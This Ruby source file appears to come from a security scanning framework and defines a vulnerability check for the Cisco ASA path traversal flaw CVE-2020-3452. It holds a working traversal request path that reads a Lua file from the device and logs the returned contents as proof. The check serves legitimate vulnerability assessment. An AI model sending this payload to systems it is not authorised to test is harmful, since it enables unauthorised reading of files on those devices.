module Intrigue
  module Task
  class CiscoAsaLimitedFileReadCve20203452 < BaseTask
  
    def self.metadata
      {
        :name => "vuln/cisco_asa_limited_file_read_cve_2020_3452",
        :pretty_name => "Vuln Check - Cisco ASA Limited File Read (CVE-2020-3452)",
        :authors => ["jcran"],
        :identifiers => [{ "cve" =>  "CVE-2020-3452" }],
        :description => "This task checks a cisco ASA for a path traversal vulnerability",
        :references => ["https://twitter.com/aboul3la/status/1286012324722155525"],
        :type => "vuln_check",
        :passive => false,
        :allowed_types => ["Uri"],
        :example_entities => [{"type" => "Uri", "details" => {"name" => "https://intrigue.io"}}],
        :allowed_options => [],
        :created_types => []
      }
    end
  
    ## Default method, subclasses must override this
    def run
      super
      
      require_enrichment

      vuln_path = "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"
      body = http_get_body "#{_get_entity_name}#{vuln_path}"
      
      if body =~ /otrizna/
        _create_linked_issue "cisco_asa_limited_file_read_cve_2020_3452", { "proof" => body }
      else 
        _log "Not vulnerable? Got: #{body}"
      end

    end
  
   
  end
  end
  end
  